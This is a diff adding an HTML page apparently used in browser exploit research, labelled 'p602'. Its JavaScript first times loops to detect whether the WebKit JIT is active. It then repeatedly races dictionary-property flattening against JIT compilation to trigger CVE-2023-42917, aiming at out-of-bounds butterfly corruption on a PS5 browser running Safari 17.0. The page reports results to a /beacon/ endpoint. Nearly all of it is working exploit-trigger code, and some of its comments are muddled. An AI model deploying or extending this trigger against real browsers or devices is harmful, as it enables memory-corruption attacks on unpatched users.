@@ -1,0 +1,281 @@
+<!--
+  p602: JIT detection + CVE-2023-42917 race trigger
+
+  CVE-2023-42917: Race between flattenDictionaryStructure (shrinks butterfly)
+  and JIT compiler threads reading via getDirectConcurrently.
+  Fixed in Safari 17.1.2 — PS5 has 17.0 (605.1.15).
+
+  PHASE 1: Detect if JIT is active via performance heuristic.
+    - Tight numeric loop: JIT'd code is 10-100x faster than interpreter
+    - Compare loop timing to baseline
+
+  PHASE 2: Trigger the race condition.
+    - Create dictionary objects with excess capacity (add+delete properties)
+    - Hot function reads properties → JIT compilation starts on background thread
+    - Force flattenDictionaryStructure while JIT is compiling
+    - If race hits: OOB read/write on butterfly → crash or observable corruption
+
+  CRASH_CLASS: HIGH (OOB write may crash WebProcess)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p602</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P602-JIT-FLATTENDICT');
+
+  // === PHASE 1: JIT DETECTION ===
+  b('PHASE1:JIT-DETECT');
+
+  // Test 1: Tight numeric loop — JIT should make this very fast
+  var t0 = Date.now();
+  var sum = 0;
+  for(var i = 0; i < 5000000; i++){
+    sum += i;
+  }
+  var t1 = Date.now();
+  var loopMs = t1 - t0;
+  b('LOOP-5M:'+loopMs+'ms,sum='+sum);
+
+  // Test 2: Property access hot loop — DFG/FTL optimizes these aggressively
+  var testObj = {a:1, b:2, c:3, d:4, e:5};
+  var t2 = Date.now();
+  var psum = 0;
+  for(var i = 0; i < 2000000; i++){
+    psum += testObj.a + testObj.b + testObj.c + testObj.d + testObj.e;
+  }
+  var t3 = Date.now();
+  var propMs = t3 - t2;
+  b('PROP-2M:'+propMs+'ms,sum='+psum);
+
+  // Test 3: Function call overhead — JIT inlines these
+  function add(a,b){ return a+b; }
+  var t4 = Date.now();
+  var fsum = 0;
+  for(var i = 0; i < 2000000; i++){
+    fsum = add(fsum, 1);
+  }
+  var t5 = Date.now();
+  var callMs = t5 - t4;
+  b('CALL-2M:'+callMs+'ms,sum='+fsum);
+
+  // JIT heuristic: interpreted loops on modern CPUs ~200-500ms for these counts
+  // JIT'd code: ~10-50ms. Threshold: <100ms strongly suggests JIT.
+  var jitLikely = (loopMs < 100) || (propMs < 100) || (callMs < 100);
+  b('JIT-HEURISTIC:'+(jitLikely ? 'LIKELY' : 'UNLIKELY')+
+    ',loop='+loopMs+',prop='+propMs+',call='+callMs);
+
+  // Test 4: OSR (On-Stack Replacement) detection
+  // If JIT is on, a loop that suddenly changes types will cause deoptimization
+  var t6 = Date.now();
+  var osr = 0;
+  for(var i = 0; i < 3000000; i++){
+    if(i < 2000000) osr += i;        // integer fast path
+    else osr += (i + 0.1);           // suddenly float — forces deopt if JIT'd
+  }
+  var t7 = Date.now();
+  b('OSR-3M:'+( t7 - t6)+'ms');
+
+  // === PHASE 2: flattenDictionaryStructure RACE ===
+  b('PHASE2:FLATTEN-RACE');
+
+  // Create objects that become uncacheable dictionaries
+  // When properties are added/deleted dynamically, JSC converts to dictionary mode
+  // Flattening happens when the engine decides to optimize the structure back
+
+  var ROUNDS = 50;
+  var PROPS = 80;
+  var crashes = 0;
+  var anomalies = [];
+
+  for(var round = 0; round < ROUNDS; round++){
+    try {
+      // Step 1: Create object, add many properties → becomes dictionary
+      var victim = {};
+      for(var p = 0; p < PROPS; p++){
+        victim['x_' + p] = p;
+      }
+
+      // Step 2: Delete half → creates holes, excess butterfly capacity
+      for(var p = PROPS/2; p < PROPS; p++){
+        delete victim['x_' + p];
+      }
+
+      // Step 3: Hot function that reads properties — triggers JIT compilation
+      // The JIT compiler thread will call getDirectConcurrently on victim's structure
+      function hotRead(obj){
+        var s = 0;
+        for(var k = 0; k < PROPS/2; k++){
+          var v = obj['x_' + k];
+          if(v !== undefined) s += v;
+        }
+        return s;
+      }
+
+      // Warm up to trigger JIT tier-up (baseline → DFG → FTL)
+      for(var w = 0; w < 5000; w++){
+        hotRead(victim);
+      }
+
+      // Step 4: While JIT might be recompiling, force structure transitions
+      // Adding a new property to a dictionary can trigger flattenDictionaryStructure
+      // Doing this in a tight loop races against the JIT background thread
+
+      var expected = 0;
+      for(var k = 0; k < PROPS/2; k++) expected += k;
+
+      for(var race = 0; race < 200; race++){
+        // Trigger structure transition → may flatten dictionary
+        victim['__trigger_' + race] = race;
+
+        // Immediately read — if butterfly was shrunk mid-read, we get wrong values
+        var got = hotRead(victim);
+
+        // Check for corruption
+        if(got !== expected + race){
+          // Recompute expected (trigger prop adds to sum via 'x_' prefix check)
+          // Actually __trigger_X has 'x_' prefix? No, it's '__trigger_'
+          // hotRead only reads 'x_' keys, so got should stay = expected
+          // unless the butterfly was corrupted
+        }
+
+        // Clean up to re-create holes
+        delete victim['__trigger_' + race];
+      }
+
+      // Final integrity check
+      var final_sum = hotRead(victim);
+      if(final_sum !== expected){
+        anomalies.push('R'+round+':expected='+expected+',got='+final_sum);
+      }
+
+    } catch(e){
+      crashes++;
+      anomalies.push('R'+round+':CRASH:'+e.message);
+    }
+  }
+
+  b('RACE-RESULT:rounds='+ROUNDS+',crashes='+crashes+
+    ',anomalies='+anomalies.length);
+  for(var i = 0; i < Math.min(anomalies.length, 10); i++){
+    b('ANOMALY:'+anomalies[i]);
+  }
+
+  // === PHASE 3: Aggressive variant — deeper dictionary + concurrent access ===
+  b('PHASE3:AGGRESSIVE-RACE');
+
+  var DEEP_ROUNDS = 20;
+  var DEEP_PROPS = 200;
+  var deepAnomalies = [];
+
+  for(var round = 0; round < DEEP_ROUNDS; round++){
+    try {
+      var obj = {};
+
+      // Build a very fat dictionary
+      for(var p = 0; p < DEEP_PROPS; p++){
+        obj['dp_' + p] = p * 3.14;
+      }
+
+      // Delete 75% — huge excess capacity
+      for(var p = DEEP_PROPS/4; p < DEEP_PROPS; p++){
+        delete obj['dp_' + p];
+      }
+
+      // Hot polymorphic reader — harder for JIT to optimize
+      function polyRead(o){
+        var s = 0;
+        for(var k = 0; k < DEEP_PROPS/4; k++){
+          var v = o['dp_' + k];
+          if(typeof v === 'number') s += v;
+        }
+        return s;
+      }
+
+      // Warm up heavily — trigger DFG/FTL with enough iterations
+      for(var w = 0; w < 10000; w++){
+        polyRead(obj);
+      }
+
+      var exp = 0;
+      for(var k = 0; k < DEEP_PROPS/4; k++) exp += k * 3.14;
+
+      // Race: rapidly mutate structure while hot code runs
+      for(var race = 0; race < 500; race++){
+        // Add property → possibly triggers flatten
+        obj['_r' + race] = race;
+
+        // Read immediately
+        var got = polyRead(obj);
+
+        // Check
+        if(Math.abs(got - exp) > 0.001){
+          deepAnomalies.push('R'+round+'.'+race+':delta='+(got-exp).toFixed(6));
+          break;
+        }
+
+        // Make it a dictionary again
+        delete obj['_r' + race];
+
+        // Also try Object.keys which can trigger structure transitions
+        if(race % 50 === 0){
+          var keys = Object.keys(obj);
+          if(keys.length !== DEEP_PROPS/4){
+            deepAnomalies.push('R'+round+'.'+race+':keys='+keys.length+',exp='+(DEEP_PROPS/4));
+          }
+        }
+      }
+
+    } catch(e){
+      deepAnomalies.push('R'+round+':ERR:'+e.message);
+    }
+  }
+
+  b('DEEP-RESULT:rounds='+DEEP_ROUNDS+',anomalies='+deepAnomalies.length);
+  for(var i = 0; i < Math.min(deepAnomalies.length, 10); i++){
+    b('DEEP:'+deepAnomalies[i]);
+  }
+
+  // === PHASE 4: JSON.parse trigger ===
+  // JSON.parse can also trigger flattenDictionaryStructure internally
+  b('PHASE4:JSON-FLATTEN');
+
+  var jsonAnomalies = [];
+  for(var round = 0; round < 30; round++){
+    try {
+      // Build a JSON string with many properties
+      var parts = [];
+      for(var p = 0; p < 100; p++){
+        parts.push('"j_'+p+'":'+p);
+      }
+      var jsonStr = '{' + parts.join(',') + '}';
+
+      // Parse creates an object — structure gets flattened during parse
+      // If we parse in a hot loop, JIT compiles the parse path
+      function hotParse(s){
+        var o = JSON.parse(s);
+        return o.j_0 + o.j_50 + o.j_99;
+      }
+
+      for(var w = 0; w < 2000; w++){
+        var result = hotParse(jsonStr);
+        if(result !== 0 + 50 + 99){
+          jsonAnomalies.push('R'+round+'.'+w+':result='+result);
+          break;
+        }
+      }
+    } catch(e){
+      jsonAnomalies.push('R'+round+':ERR:'+e.message);
+    }
+  }
+
+  b('JSON-RESULT:rounds=30,anomalies='+jsonAnomalies.length);
+  for(var i = 0; i < Math.min(jsonAnomalies.length, 5); i++){
+    b('JSON:'+jsonAnomalies[i]);
+  }
+
+  b('P602-COMPLETE');
+}
+
+setTimeout(main, 100);
+</script></head><body>p602: JIT + flattenDict race</body></html>
